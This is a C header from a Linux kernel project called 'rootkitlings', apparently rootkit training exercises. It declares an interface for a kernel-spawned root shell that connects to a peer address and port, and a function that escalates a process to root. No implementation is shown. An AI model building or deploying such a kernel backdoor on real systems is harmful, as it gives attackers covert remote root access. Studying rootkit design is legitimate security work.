/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKITLINGS_ROOT_SHELL_H
#define ROOTKITLINGS_ROOT_SHELL_H

#include <linux/compiler_attributes.h>
#include <linux/mutex.h>
#include <linux/types.h>
#include <linux/workqueue.h>

struct file;
struct pid;
struct socket;

enum rk_root_shell_state {
	RK_ROOT_SHELL_IDLE,
	RK_ROOT_SHELL_CONNECTING,
	RK_ROOT_SHELL_RUNNING,
	RK_ROOT_SHELL_EXITED,
	RK_ROOT_SHELL_REFUSED,
	RK_ROOT_SHELL_TIMED_OUT,
	RK_ROOT_SHELL_FAILED,
	RK_ROOT_SHELL_STOPPED,
};

struct rk_root_shell_status {
	u32 request_id;
	enum rk_root_shell_state state;
	int result;
};

struct rk_root_shell_ticket {
	u32 request_id;
	u64 cookie;
};

struct rk_root_shell {
	struct mutex lock;
	struct work_struct work;
	struct delayed_work timeout_work;
	struct socket *socket;
	struct file *file;
	struct pid *leader;
	__be32 peer_address;
	u16 port;
	unsigned int timeout_ms;
	u32 next_request_id;
	u32 request_id;
	u64 cookie;
	enum rk_root_shell_state state;
	bool initialized;
	bool busy;
	bool stopping;
	bool timed_out;
	int result;
};

__must_check int rk_root_shell_init(struct rk_root_shell *shell,
				    unsigned int timeout_ms);
__must_check int rk_root_shell_request(struct rk_root_shell *shell,
				       __be32 peer_address, u16 port,
				       struct rk_root_shell_ticket *ticket);
void rk_root_shell_snapshot(struct rk_root_shell *shell,
			    struct rk_root_shell_status *status);
const char *rk_root_shell_state_name(enum rk_root_shell_state state);
void rk_root_shell_stop(struct rk_root_shell *shell);

int rk_escalate_pid(unsigned int pid);

#endif
